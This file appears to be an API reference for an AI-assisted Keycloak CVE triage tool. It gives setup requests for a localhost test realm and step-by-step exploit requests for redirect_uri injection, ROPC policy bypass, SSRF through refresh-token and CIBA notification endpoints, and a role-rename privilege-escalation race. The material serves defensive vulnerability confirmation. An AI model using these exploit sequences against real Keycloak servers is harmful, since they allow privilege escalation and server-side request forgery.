# Keycloak Admin REST API Schemas
## Reference Payloads for Bob-Sentry Script Generation

> **Purpose:** Code mode MUST consult this document when generating Python triage scripts.
> Never hallucinate API shapes — use the exact payloads and endpoints defined here.
>
> **Templating convention:** `{{PLACEHOLDER}}` values must be substituted at script
> generation time. Default values are shown in the legend below.

---

## Placeholder Legend

| Placeholder | Default Value | Notes |
|---|---|---|
| `{{BASE_URL}}` | `http://localhost:8080` | Never change. Rule 1 of security-guardrails.md |
| `{{REALM}}` | `triage-realm` | The test realm created in Script A |
| `{{CLIENT_ID}}` | `triage-client` | The test OIDC client created in Script A |
| `{{CLIENT_SECRET}}` | `triage-secret` | Set during client creation in Script A |
| `{{USERNAME}}` | `triage-user` | Test user created in Script A |
| `{{PASSWORD}}` | `triage-pass` | Test user password |
| `{{ADMIN_USER}}` | `admin` | Bootstrap admin (Rule 4 of security-guardrails.md) |
| `{{ADMIN_PASS}}` | `admin` | Bootstrap admin password |
| `{{ROLE_NAME}}` | `triage-role` | Test role name |

---

## Section A — Setup Operations (Script A)

These operations configure the isolated test environment. Execute in order.

---

### A1. Obtain Admin Access Token

```
POST {{BASE_URL}}/realms/master/protocol/openid-connect/token
Content-Type: application/x-www-form-urlencoded

grant_type=password
&client_id=admin-cli
&username={{ADMIN_USER}}
&password={{ADMIN_PASS}}
```

**Python (requests):**
```python
import requests

resp = requests.post(
    f"{BASE_URL}/realms/master/protocol/openid-connect/token",
    data={
        "grant_type": "password",
        "client_id": "admin-cli",
        "username": ADMIN_USER,
        "password": ADMIN_PASS,
    },
)
resp.raise_for_status()
admin_token = resp.json()["access_token"]
headers = {"Authorization": f"Bearer {admin_token}"}
```

**Expected response:** `200 OK` with `access_token` in body.

---

### A2. Create Test Realm

```
POST {{BASE_URL}}/admin/realms
Authorization: Bearer {{ADMIN_TOKEN}}
Content-Type: application/json

{
  "realm": "{{REALM}}",
  "enabled": true,
  "displayName": "Bob-Sentry Triage Realm",
  "registrationAllowed": false,
  "loginWithEmailAllowed": true,
  "duplicateEmailsAllowed": false,
  "resetPasswordAllowed": false,
  "editUsernameAllowed": false,
  "bruteForceProtected": false
}
```

**Expected response:** `201 Created`

---

### A3. Create OIDC Client

```
POST {{BASE_URL}}/admin/realms/{{REALM}}/clients
Authorization: Bearer {{ADMIN_TOKEN}}
Content-Type: application/json

{
  "clientId": "{{CLIENT_ID}}",
  "enabled": true,
  "protocol": "openid-connect",
  "publicClient": false,
  "secret": "{{CLIENT_SECRET}}",
  "standardFlowEnabled": true,
  "directAccessGrantsEnabled": true,
  "serviceAccountsEnabled": false,
  "redirectUris": ["http://localhost:9999/*"],
  "webOrigins": ["http://localhost:9999"],
  "attributes": {
    "pkce.code.challenge.method": ""
  }
}
```

**Expected response:** `201 Created`

> **For CVE-2026-9689 triage:** Set `redirectUris` to `["http://localhost:9999/*"]` (wildcard).  
> **For CVE-2026-9792 triage:** Add a client policy to the realm before creating this client.

---

### A4. Get Internal Client UUID (needed for subsequent calls)

```
GET {{BASE_URL}}/admin/realms/{{REALM}}/clients?clientId={{CLIENT_ID}}
Authorization: Bearer {{ADMIN_TOKEN}}
```

**Expected response:** `200 OK` — JSON array; take `[0].id` as `CLIENT_UUID`.

---

### A5. Create Test User

```
POST {{BASE_URL}}/admin/realms/{{REALM}}/users
Authorization: Bearer {{ADMIN_TOKEN}}
Content-Type: application/json

{
  "username": "{{USERNAME}}",
  "enabled": true,
  "email": "triage-user@localhost.test",
  "firstName": "Triage",
  "lastName": "User",
  "credentials": [
    {
      "type": "password",
      "value": "{{PASSWORD}}",
      "temporary": false
    }
  ]
}
```

**Expected response:** `201 Created`  
Capture the `Location` header — last path segment is the `USER_UUID`.

---

### A6. Create Realm Role

```
POST {{BASE_URL}}/admin/realms/{{REALM}}/roles
Authorization: Bearer {{ADMIN_TOKEN}}
Content-Type: application/json

{
  "name": "{{ROLE_NAME}}",
  "description": "Bob-Sentry test role",
  "composite": false,
  "clientRole": false
}
```

**Expected response:** `201 Created`

---

### A7. Assign Role to User

```
GET {{BASE_URL}}/admin/realms/{{REALM}}/roles/{{ROLE_NAME}}
Authorization: Bearer {{ADMIN_TOKEN}}
```
Capture role object, then:

```
POST {{BASE_URL}}/admin/realms/{{REALM}}/users/{{USER_UUID}}/role-mappings/realm
Authorization: Bearer {{ADMIN_TOKEN}}
Content-Type: application/json

[
  {
    "id": "{{ROLE_ID}}",
    "name": "{{ROLE_NAME}}"
  }
]
```

**Expected response:** `204 No Content`

---

### A8. Unassign Role from User (used for CVE-2026-11986 triage)

```
DELETE {{BASE_URL}}/admin/realms/{{REALM}}/users/{{USER_UUID}}/role-mappings/realm
Authorization: Bearer {{ADMIN_TOKEN}}
Content-Type: application/json

[
  {
    "id": "{{ROLE_ID}}",
    "name": "{{ROLE_NAME}}"
  }
]
```

**Expected response (patched):** `403 Forbidden`  
**Expected response (vulnerable):** `204 No Content`

---

### A9. Get Client Secret

```
GET {{BASE_URL}}/admin/realms/{{REALM}}/clients/{{CLIENT_UUID}}/client-secret
Authorization: Bearer {{ADMIN_TOKEN}}
```

**Expected response:** `200 OK` with `{ "value": "{{CLIENT_SECRET}}" }`

---

## Section B — Exploit Operations (Script B)

These operations represent the actual exploit payloads. Execute after Script A succeeds.

---

### B1. Standard Authorization Code Flow Initiation

```
GET {{BASE_URL}}/realms/{{REALM}}/protocol/openid-connect/auth
  ?client_id={{CLIENT_ID}}
  &response_type=code
  &redirect_uri=http://localhost:9999/callback
  &scope=openid
  &state=test-state-123
```

**For CVE-2026-9689 triage — inject OIDC parameters into redirect_uri:**
```
GET {{BASE_URL}}/realms/{{REALM}}/protocol/openid-connect/auth
  ?client_id={{CLIENT_ID}}
  &response_type=code
  &redirect_uri=http://localhost:9999/callback%3Fcode%3DFAKE_CODE%26state%3DFAKE_STATE
  &scope=openid
  &state=real-state-456
```

---

### B2. Obtain User Token (Authorization Code Exchange)

```
POST {{BASE_URL}}/realms/{{REALM}}/protocol/openid-connect/token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code
&client_id={{CLIENT_ID}}
&client_secret={{CLIENT_SECRET}}
&code={{AUTH_CODE}}
&redirect_uri=http://localhost:9999/callback
```

**Expected response:** `200 OK` with `access_token`, `refresh_token`

---

### B3. ROPC Token Request (for CVE-2026-9792 triage)

```
POST {{BASE_URL}}/realms/{{REALM}}/protocol/openid-connect/token
Content-Type: application/x-www-form-urlencoded

grant_type=password
&client_id={{CLIENT_ID}}
&client_secret={{CLIENT_SECRET}}
&username={{USERNAME}}
&password={{PASSWORD}}
&scope=openid
```

**Triage interpretation:**
- If a client policy is configured that should block this client, and this request returns
  `200 OK` → CVE-2026-9792 confirmed (policy not enforced for ROPC)
- If `400 Bad Request` or `401` → patched

---

### B4. Refresh Token with Custom client_session_host (for CVE-2026-4874 triage)

```
POST {{BASE_URL}}/realms/{{REALM}}/protocol/openid-connect/token
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token
&client_id={{CLIENT_ID}}
&client_secret={{CLIENT_SECRET}}
&refresh_token={{REFRESH_TOKEN}}
&client_session_host=127.0.0.1:9999
```

**Setup required:** Client must have `backchannel.logout.url` set to a URL containing
`${application.session.host}`. A netcat listener or mock server on port 9999 captures
the outbound SSRF request.

---

### B5. Trigger Admin Backchannel Logout (for CVE-2026-4874 triage)

```
POST {{BASE_URL}}/admin/realms/{{REALM}}/users/{{USER_UUID}}/logout
Authorization: Bearer {{ADMIN_TOKEN}}
```

**Expected response:** `204 No Content`  
**Triage check:** Observe whether the mock server on port 9999 received an HTTP POST.

---

### B6. Rename a Realm Role (for CVE-2026-9796 triage)

```
PUT {{BASE_URL}}/admin/realms/{{REALM}}/roles-by-id/{{ROLE_ID}}
Authorization: Bearer {{ADMIN_TOKEN}}
Content-Type: application/json

{
  "id": "{{ROLE_ID}}",
  "name": "{{ROLE_NAME}}-renamed",
  "description": "Renamed for TOCTOU triage"
}
```

**Sequence for CVE-2026-9796:**
1. Rename admin role (B6) — removes from name-based guard
2. Add as composite to controlled role (A6 variant) — window is now open
3. Rename back (B6 reverse) — composite relationship persists

---

### B7. Add Composite Role Relationship (for CVE-2026-9796 triage)

```
POST {{BASE_URL}}/admin/realms/{{REALM}}/roles-by-id/{{SOURCE_ROLE_ID}}/composites
Authorization: Bearer {{ADMIN_TOKEN}}
Content-Type: application/json

[
  {
    "id": "{{TARGET_ROLE_ID}}",
    "name": "{{TARGET_ROLE_NAME}}"
  }
]
```

**Expected response (patched):** `403 Forbidden`  
**Expected response (vulnerable):** `204 No Content`

---

## Section C — FGAP-Specific Setup (for CVE-2026-11986 triage)

FGAP (Fine-Grained Admin Permissions) v1 requires specific realm and policy configuration.

---

### C1. Enable Fine-Grained Admin Permissions on Realm

```
PUT {{BASE_URL}}/admin/realms/{{REALM}}
Authorization: Bearer {{ADMIN_TOKEN}}
Content-Type: application/json

{
  "adminPermissionsEnabled": true
}
```

---

### C2. Create a Delegated Admin User

Follow A5 to create a second user (e.g. `delegated-admin`), then grant them only the
`view-users` realm role (not `realm-admin`). Configure a FGAP policy scoping them to
manage only `{{ROLE_NAME}}`.

---

### C3. Obtain Delegated Admin Token

```
POST {{BASE_URL}}/realms/{{REALM}}/protocol/openid-connect/token
Content-Type: application/x-www-form-urlencoded

grant_type=password
&client_id=admin-cli
&username=delegated-admin
&password=delegated-pass
```

Use this token (not the master admin token) when executing B8 (unassign out-of-scope role)
to test the FGAP bypass.

---

---

## Section D — CIBA-Specific Setup & Exploit (for CIBA SSRF triage)

Learned from live triage of issue #49915 (CVE-2026-1518).

---

### CIBA Attribute Key Reference

These constants come from `CibaConfig.java` — always verify against source before scripting:

| Constant | Attribute Key | Scope |
|---|---|---|
| `OIDC_CIBA_GRANT_ENABLED` | `oidc.ciba.grant.enabled` | Client attribute |
| `CIBA_BACKCHANNEL_TOKEN_DELIVERY_MODE_PER_CLIENT` | `ciba.backchannel.token.delivery.mode` | Client attribute |
| `CIBA_BACKCHANNEL_CLIENT_NOTIFICATION_ENDPOINT` | `ciba.backchannel.client.notification.endpoint` | Client attribute |
| `CIBA_BACKCHANNEL_TOKEN_DELIVERY_MODE` | `cibaBackchannelTokenDeliveryMode` | Realm attribute |
| `CIBA_EXPIRES_IN` | `cibaExpiresIn` | Realm attribute |
| `CIBA_INTERVAL` | `cibaInterval` | Realm attribute |
| `CIBA_AUTH_REQUESTED_USER_HINT` | `cibaAuthRequestedUserHint` | Realm attribute |

---

### D1. Enable CIBA on Realm

```
PUT {{BASE_URL}}/admin/realms/{{REALM}}
Authorization: Bearer {{ADMIN_TOKEN}}
Content-Type: application/json

{
  "attributes": {
    "cibaBackchannelTokenDeliveryMode": "ping",
    "cibaExpiresIn": "120",
    "cibaInterval": "5",
    "cibaAuthRequestedUserHint": "login_hint"
  }
}
```

**Expected response:** `204 No Content`

---

### D2. Create CIBA Ping-Mode Client

```
POST {{BASE_URL}}/admin/realms/{{REALM}}/clients
Authorization: Bearer {{ADMIN_TOKEN}}
Content-Type: application/json

{
  "clientId": "{{CLIENT_ID}}",
  "enabled": true,
  "protocol": "openid-connect",
  "publicClient": false,
  "secret": "{{CLIENT_SECRET}}",
  "standardFlowEnabled": true,
  "directAccessGrantsEnabled": true,
  "redirectUris": ["http://localhost:9999/*"],
  "attributes": {
    "oidc.ciba.grant.enabled": "true",
    "ciba.backchannel.token.delivery.mode": "ping",
    "ciba.backchannel.client.notification.endpoint": "http://host.containers.internal:{{MOCK_PORT}}/notify"
  }
}
```

**Expected response:** `201 Created`

> **Networking note:** Use `host.containers.internal` (Podman/macOS) so Keycloak can reach
> the mock server running on the host. The SSRF *attack payload* uses `127.0.0.1` to prove
> Keycloak doesn't validate the host — but the working mock endpoint must use
> `host.containers.internal`.

---

### D3. CIBA Backchannel Auth Request (Ping Mode)

```
POST {{BASE_URL}}/realms/{{REALM}}/protocol/openid-connect/ext/ciba/auth
Authorization: Basic base64({{CLIENT_ID}}:{{CLIENT_SECRET}})
Content-Type: application/x-www-form-urlencoded

scope=openid
&login_hint={{USERNAME}}
&client_notification_token={{CLIENT_NOTIFICATION_TOKEN}}
```

**`client_notification_token`** is mandatory for ping mode — an opaque bearer token that
Keycloak echoes back when POSTing to the notification endpoint. Use any non-empty string
(e.g. `triage-notification-token-12345`).

**Expected response:** `200 OK` with `auth_req_id` (a JWE token)

---

### D4. CIBA Auth Channel Callback (Approve the auth)

```
POST {{BASE_URL}}/realms/{{REALM}}/protocol/openid-connect/ext/ciba/auth/callback
Authorization: Bearer {{CHANNEL_BEARER_TOKEN}}
Content-Type: application/json

{
  "status": "SUCCEED",
  "auth_req_id": "{{AUTH_REQ_ID}}"
}
```

`{{CHANNEL_BEARER_TOKEN}}` is the `Authorization: Bearer ...` header that Keycloak sends
to the `/channel` endpoint. The mock server must capture it from the request headers and
replay it on the callback.

**Expected response:** `200 OK` (triggers Keycloak to POST to the notification endpoint)

---

### D5. Mock Server Contract for CIBA Triage

| Endpoint | Must respond with | Notes |
|---|---|---|
| `POST /channel` | **`201 Created`** | `200 OK` causes Keycloak to throw `"Unexpected response from authentication device"` |
| `POST /notify` | `200 OK` | The SSRF target — capture inbound body to confirm exploit |
| `POST /logout` (OIDC backchannel) | `200 OK` | For CVE-2026-4874 pattern |

> **Timing rule:** Start the `/notify` listener thread **before** sending the D4 callback
> POST. Keycloak fires the notification synchronously during callback processing — if the
> listener starts after, the POST is missed.

---

### D6. SPI Configuration for CIBA Auth Channel (docker-compose `command:` flag)

The HTTP authentication channel URI is a **server-level SPI config**, not a realm attribute.
It must be passed as a `--spi-*` flag to the `start-dev` command:

```
--spi-ciba-auth-channel-ciba-http-auth-channel-http-authentication-channel-uri=http://host.containers.internal:9999/channel
```

Derivation:
- SPI name: `ciba-auth-channel` → from `AuthenticationChannelSpi.getName()`
- Provider ID: `ciba-http-auth-channel` → from `HttpAuthenticationChannelProviderFactory.PROVIDER_ID`
- Config key: `httpAuthenticationChannelUri` → from `HttpAuthenticationChannelProviderFactory.init()`

The flag format is: `--spi-{spi-name}-{provider-id}-{config-key-kebab-case}`

---

*This document is maintained as part of Bob-Sentry. Add new API shapes here as new CVE
patterns are introduced. Never hardcode real credentials in this file.*
